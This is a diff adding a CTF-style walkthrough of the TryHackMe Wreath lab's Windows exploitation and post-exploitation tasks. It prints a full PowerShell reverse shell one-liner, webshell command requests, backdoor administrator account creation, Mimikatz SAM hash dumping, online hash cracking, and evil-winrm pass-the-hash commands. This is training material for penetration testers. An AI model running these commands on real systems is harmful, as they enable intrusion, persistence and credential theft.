@@ -1215,6 +1215,326 @@ If you are using cURL then there are a variety of options available. cURL does p
 
 <figure><img src="https://assets.tryhackme.com/additional/wreath-network/be3ea7bf0fe6.png" alt=""><figcaption></figcaption></figure>
 
+## Exploitation
+
+In the previous task we had a look through the source code of the exploit we found, identified the lines which needed to be updated, then made the necessary changes.
+
+It is now time to run the exploit!
+
+<figure><img src="https://assets.tryhackme.com/additional/wreath-network/d7bd5d950eae.png" alt=""><figcaption></figcaption></figure>
+
+Success!
+
+Not only did the exploit work perfectly, it gave us command execution as NT AUTHORITY\SYSTEM, the highest ranking local account on a Windows target.
+
+From here we want to obtain a full reverse shell. We have two options for this:
+
+1. We could change the command in the exploit and re-run the code
+2. We could use our knowledge of the script to leverage the same webshell to execute more commands for us, without performing the full exploit twice
+
+Option number two is a lot quieter than option number 1, so let's use that.
+
+The webshell we have uploaded responds to a POST request using the parameter "`a`" (by default). This means that we have two easy ways to access this. We could use cURL from the command line, or BurpSuite for a GUI option.
+
+With cURL:\
+`curl -X POST http://IP/web/exploit-USERNAME.php -d "a=COMMAND"`\
+
+
+![Using cURL to activate the webshell, gaining the same result as in the previous screenshot](https://assets.tryhackme.com/additional/wreath-network/c4fb965ea6f5.png)
+
+_Note: in this screenshot,_ `gitserver.thm` _has been added to the_ `/etc/hosts` _file on the attacking machine, mapped to the target IP address._\
+
+
+With BurpSuite:\
+We first turn on our Burp proxy (see the [Burpsuite room](https://tryhackme.com/room/rpburpsuite) if you need help with this!) and navigate to the exploit URL:\
+![Capturing a request with BurpSuite](https://assets.tryhackme.com/additional/wreath-network/3b9c350a53d8.png)
+
+We then press `Ctrl + R` to send the request to Repeater on the top menu.\
+
+
+Next we change the "GET" on line 1 to "POST". We then add a `Content-Type` header on line 9 to tell the server to accept POST paramters:\
+`Content-Type: application/x-www-form-urlencoded`\
+
+
+Finally, on line 11 we add `a=COMMAND`:
+
+<figure><img src="https://assets.tryhackme.com/additional/wreath-network/640de3e036a9.png" alt=""><figcaption></figcaption></figure>
+
+Press send, and see the response come in!
+
+<figure><img src="https://assets.tryhackme.com/additional/wreath-network/063482e92f8b.png" alt=""><figcaption></figcaption></figure>
+
+With two methods available, pick your favourite and we'll aim for a shell!
+
+### Answer the questions
+
+**First up, let's use some basic enumeration to get to grips with the webshell:**
+
+**What is the hostname for this target?**
+
+```
+// Some code
+```
+
+**What operating system is this target?**
+
+```
+/
+```
+
+**What user is the server running as?**
+
+```
+/
+```
+
+**Before we go for a reverse shell, we need to establish whether or not this target is allowed to connect to the outside world. The typical way of doing this is by executing the `ping` command on the compromised server to ping our own IP and using a network interceptor (Wireshark, TCPDump, etc) to see if the ICMP echo requests make it through. If they do then network connectivity is established, otherwise we may need to go back to the drawing board.**
+
+**To start up a TCPDump listener we would use the following command:**\
+&#xNAN;**`tcpdump -i tun0 icmp`**\
+
+
+_**Note: if your VPN is not using the tun0 interface then you will need to replace this with the correct interface for your system which can be found using**_**&#x20;`ip -a link`&#x20;**_**to see the available interfaces.**_\
+
+
+**Now, using the webshell, execute the following ping command (substituting in your own VPN IP!):**\
+&#xNAN;**`ping -n 3 ATTACKING_IP`**\
+
+
+**This will send three ICMP ping packets back to you.**
+
+**How many make it to the waiting listener?**
+
+```
+/
+```
+
+Looks like we're going to need to think outside the box to catch this shell.
+
+We have two easy options here:
+
+* Given we have a fully stable shell on .200, we could upload a static copy of [netcat](https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/ncat) and just catch the shell here
+* We could set up a relay on .200 to forward a shell back to a listener
+
+It is up to you which option you choose (although for the sake of practice, a socat relay is suggested); however, whichever way you choose, please be mindful of other users at earlier stages of the network and ensure that any ports you open are above 15000.
+
+Before we can do this, however, we need to take one other thing into account. CentOS uses an always-on wrapper around the IPTables firewall called "firewalld". By default, this firewall is extremely restrictive, only allowing access to SSH and anything else the sysadmin has specified. Before we can start capturing (or relaying) shells, we will need to open our desired port in the firewall. This can be done with the following command:\
+`firewall-cmd --zone=public --add-port PORT/tcp`\
+Substituting in your desired choice of port.
+
+In this command we are using two switches. First we set the zone to public -- meaning that the rule will apply to every inbound connection to this port. We then specify which port we want to open, along with the protocol we want to use (TCP).\
+
+
+With that done, set up either a listener or a relay on .200.
+
+Let's go for a reverse shell!
+
+We can use a Powershell reverse shell for this. Take the following shell command and substitute in the IP of the webserver, and the port you opened in the `.200` firewall in the previous question where it says IP and PORT:\
+`powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`\
+
+
+As this is a web exploit, we now have to URL encode the shell command. If using Burpsuite, you can do this by pasting the command in as the value for the "a" parameter, then selecting it and pressing Ctrl + U:
+
+<figure><img src="https://assets.tryhackme.com/additional/wreath-network/f670383bd3e5.png" alt=""><figcaption></figcaption></figure>
+
+If you are using cURL then there are a variety of options available. cURL does provide a `--data-urlencode` switch; however, it's often easiest to just use a [website](https://www.urlencoder.org/) to encode the shell command, then copy it in with the `-d` switch:
+
+<figure><img src="https://assets.tryhackme.com/additional/wreath-network/be3ea7bf0fe6.png" alt=""><figcaption></figcaption></figure>
+
+Pick a method (cURL, BurpSuite, or any others) and get a shell!
+
+## Stabilisation & Post Exploitation
+
+In the last task we got remote command execution running with the highest permissions possible on a local Windows machine, which means that we do not need to escalate privileges on this target.
+
+In the upcoming tasks we will be looking at the second teaching point of this network -- the command and control framework: Empire. Before we do that though, let's consolidate our position a little.
+
+From the enumeration we did on this target we know that ports 3389 and 5985 are open. This means that (using an account with the correct privileges) we should be able to obtain either a GUI through RDP (port 3389) or a stable CLI shell using WinRM (port 5985).
+
+Specifically, we need a user account (as opposed to the service account which we're currently using), with the "Remote Desktop Users" group for RDP, or the "Remote Management Users" group for WinRM. A user in the "Administrators" group trumps the RDP group, and the original Administrator account can access either at will.\
+
+
+We already have the ultimate access, so let's create such an account! Choose a unique username here (your TryHackMe username would do), and obviously pick a password which you don't use _anywhere_ else.
+
+First we create the account itself:\
+`net user USERNAME PASSWORD /add`\
+
+
+Next we add our newly created account in the "Administrators" and "Remote Management Users" groups:\
+`net localgroup Administrators USERNAME /add`\
+`net localgroup "Remote Management Users" USERNAME /add`\
+
+
+![Adding a new user](https://assets.tryhackme.com/additional/wreath-network/5b8e4ccaed23.png)\
+
+
+We can now use this account to get stable access to the box!\
+
+
+***
+
+As mentioned previously, we could use either RDP or WinRM for this.
+
+_Note: Whilst the target is set up to allow multiple sessions over RDP, for the sake of other users attacking the network in conjunction with memory limitations on the target, it would be appreciated if you stuck to the CLI based WinRM for the most part. We will use RDP briefly in the next section of this task, but otherwise please use WinRM when moving forward in the network._\
+
+
+Let's access the box over WinRM. For this we'll be using an awesome little tool called [evil-winrm](https://github.com/Hackplayers/evil-winrm).
+
+This does not come installed by default on Kali, so use the following command to install it from the Ruby Gem package manager:\
+`sudo gem install evil-winrm`
+
+With evil-winrm installed, we can connect to the target with the syntax shown here:\
+`evil-winrm -u USERNAME -p PASSWORD -i TARGET_IP`
+
+![Authenticating with Evil-WinRM](https://assets.tryhackme.com/additional/wreath-network/28b967dedffa.png)\
+\
+&#xNAN;_&#x49;f you used an SSH portforward rather than sshuttle to access the Git Server, you will need to set up a second tunnel here to access port 5985. In this case you may also need to specify the target port using the -P switch (e.g. -_`i 127.0.0.1 -P 58950`_)._
+
+Note that evil-winrm usually gives medium integrity shells for added administrator accounts. Even if your new account has Administrator permissions, you won't actually be able to perform administrative actions with it via winrm.\
+
+
+***
+
+Now let's look at connecting over RDP for a GUI environment.
+
+There are many RDP clients available for Linux. One of the most versatile is "xfreerdp" -- this is what we will be using here. If not already installed, you can install xfreerdp with the command:\
+`sudo apt install freerdp2-x11`
+
+As mentioned, xfreerdp is an incredibly versatile tool with a vast number of options available. These range from routing audio and USB connections into the target, through to pass-the-hash attacks over RDP. The most basic syntax for connecting is as follows:\
+`xfreerdp /v:IP /u:USERNAME /p:PASSWORD`
+
+For example:\
+`xfreerdp /v:172.16.0.5 /u:user /p:'password123!'`
+
+Note that (as this is a command line tool), passwords containing special characters must be enclosed in quotes.\
+
+
+When authentication has successfully taken place, a new window will open giving GUI access to the target.\
+
+
+<figure><img src="https://assets.tryhackme.com/additional/wreath-network/a40854512a5e.png" alt=""><figcaption></figcaption></figure>
+
+That said, we can do a _lot_ more with xfreerdp. These switches are particularly useful:-
+
+* `/dynamic-resolution` -- allows us to resize the window, adjusting the resolution of the target in the process
+* `/size:WIDTHxHEIGHT` -- sets a specific size for targets that don't resize automatically with `/dynamic-resolution`
+* `+clipboard` -- enables clipboard support
+* `/drive:LOCAL_DIRECTORY,SHARE_NAME` -- creates a shared drive between the attacking machine and the target. This switch is insanely useful as it allows us to very easily use our toolkit on the remote target, and save any outputs back directly to our own hard drive. In essence, this means that we never actually have to create any files on the target. For example, to share the current directory in a share called `share`, you could use: `/drive:.,share`, with the period (`.`) referring to the current directory\
+
+
+When creating a shared drive, this can be accessed either from the command line as `\\tsclient\`, or through File Explorer under "This PC":\
+
+
+<figure><img src="https://assets.tryhackme.com/additional/wreath-network/9cd2021f9d36.png" alt=""><figcaption></figcaption></figure>
+
+Note that the name of the share will change according to what you selected in the `/drive` switch.
+
+A useful directory to share is the `/usr/share/windows-resources` directory on Kali. This shares most of the Windows tools stockpiled on Kali, including Mimikatz which we will be using next. This would make the full command:\
+`xfreerdp /v:IP /u:USERNAME /p:PASSWORD +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share`\
+
+
+***
+
+With GUI access obtained and our Windows resources shared to the target, we can now very easily use Mimikatz to dump the local account password hashes for this target. Next we open up a `cmd.exe` or `PowerShell` window _as an administrator_ (i.e. right click on the icon, then click "Run as administrator") in the GUI and enter the following command:\
+`\\tsclient\share\mimikatz\x64\mimikatz.exe`\
+
+
+<figure><img src="https://assets.tryhackme.com/additional/wreath-network/fcb90c0d6fc5.png" alt=""><figcaption></figcaption></figure>
+
+_Note: if you used a different share name, you would need to substitute this in. Equally, if the command errors out, you may need to install mimikatz on Kali with_ `sudo apt install mimikatz`_._
+
+With Mimikatz loaded, we next need to give ourselves the Debug privilege and elevate our integrity to SYSTEM level. This can be done with the following commands:\
+`privilege::debug`\
+`token::elevate`
+
+<figure><img src="https://assets.tryhackme.com/additional/wreath-network/ce71a0375943.png" alt=""><figcaption></figcaption></figure>
+
+If we want we could log Mimikatz output with the `log` command. For example: `log c:\windows\temp\mimikatz.log`, would save the Mimikatz output into the Windows Temp directory. This could also be saved directly into our Kali machine, but be aware that the remote destination must be writeable to the local user running the RDP session.\
+
+
+We can now dump all of the SAM local password hashes using:\
+`lsadump::sam`\
+
+
+Near the top of the results you will see the Administrator's NTLM hash:
+
+<figure><img src="https://assets.tryhackme.com/additional/wreath-network/7e1e0a52e601.png" alt=""><figcaption></figcaption></figure>
+
+Jackpot!
+
+### Answer the questions
+
+**Create an account on the target. Assign it to the `Administrators` and `Remote Management Users` groups.**
+
+```
+// Some code
+```
+
+**Authenticate with WinRM -- make sure you can get a stable session on the target.**
+
+```
+/
+```
+
+**Authenticate with RDP, sharing a local copy of Mimikatz, then dump the password hashes for the users in the system.**
+
+**What is the Administrator password hash?**
+
+```
+/
+```
+
+**What is the NTLM password hash for the user "Thomas"?**
+
+```
+/
+```
+
+**You won't be able to crack the Administratrator hash, but let's try cracking Thomas' password hash. Tools such as Hashcat or John the Ripper are versatile and good for most password cracking situations; however, the unsalted NTLM password hash we have in our possession can be cracked using a much simpler method.**
+
+**Sites such as** [**Crackstation**](https://crackstation.net/) **perform password&#x20;**_**lookups.**_**&#x20;In other words, they store a huge database of password/hash combinations, meaning that they can take a hash and instantly look up the already cracked password.**
+
+**Use Crackstation to break Thomas' hash!**
+
+![Cracking Thomas' hash in CrackStation](https://assets.tryhackme.com/additional/wreath-network/ddb9216f5dd4.png)
+
+_**Note: It should go without saying that you should never enter client password hashes into an online cracking tool in the real world. Crackstation is very good to quickly find the password in this context, however. Instead we would be more likely to crack the hashes locally using something like Hashcat -- or better yet, pass them over to a very powerful computer owned by our employers, designed to crack passwords quickly.**_\
+
+
+**What is Thomas' password?**
+
+```
+/
+```
+
+**In the real world this would be enough to obtain stable access; however, in our current environment, the new account will be deleted if the network is reset.**
+
+**For this reason you are encouraged to to use the evil-winrm built-in pass-the-hash technique using the Administrator hash we looted.**
+
+**To do this we use the `-H` switch&#x20;**_**instead of**_**&#x20;the `-p` switch we used before.**
+
+**For example:**\
+&#xNAN;**`evil-winrm -u Administrator -H ADMIN_HASH -i IP`**\
+
+
+![Pass the hash with Evil-WinRM](https://assets.tryhackme.com/additional/wreath-network/db2e05f41573.png)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
